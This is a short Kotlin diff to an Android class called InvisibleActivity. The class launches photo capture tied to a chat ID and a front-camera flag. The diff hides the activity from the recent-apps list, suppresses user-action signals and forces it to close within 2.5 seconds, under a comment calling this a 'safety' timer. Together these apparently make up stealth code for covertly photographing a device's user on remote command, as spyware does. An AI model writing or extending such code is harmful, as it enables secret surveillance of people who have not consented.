@@ -58,7 +58,12 @@ class InvisibleActivity : Activity() {
                     putExtra(EXTRA_CHAT_ID, chatId)
                     putExtra(EXTRA_IS_FRONT, isFront)
                     putExtra(EXTRA_DURATION, duration)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
+                    )
                 }
                 context.startActivity(intent)
             } catch (e: Exception) {
@@ -99,6 +104,11 @@ class InvisibleActivity : Activity() {
         val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
         val isFront = intent.getBooleanExtra(EXTRA_IS_FRONT, false)
         val duration = intent.getIntExtra(EXTRA_DURATION, 10)
+
+        // Safety self-destruction timer: guarantee finish in <2.5 seconds under all edge cases
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { if (!isFinishing) finish() } catch (_: Exception) {}
+        }, 2500)
 
         when (action) {
             ACTION_PHOTO -> capturePhotoResumed(chatId, isFront)
